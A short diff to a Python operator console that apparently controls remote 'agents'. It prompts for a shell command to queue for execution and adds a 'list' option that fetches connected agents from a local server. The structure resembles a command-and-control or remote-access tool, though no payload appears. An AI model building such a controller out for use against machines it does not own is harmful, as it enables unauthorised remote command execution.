@@ -1,6 +1,8 @@
 import server_controlling
 import random
 import shared
+import server
+import requests
 print(""" 
 command 
 ███████╗██████╗ ███████╗██████╗ ██╗   ██╗███████╗
@@ -38,6 +40,12 @@ while True:
     elif user_input.lower() == "command":
         command = input("Which cmd should be executed: ")
         shared.set_command(command)
+
+
+
+    elif user_input.lower() == "list":
+        response = requests.get("http://127.0.0.1:5000/agent/list")
+        print(response.text)
     else:
         print("Command not recognized")
 
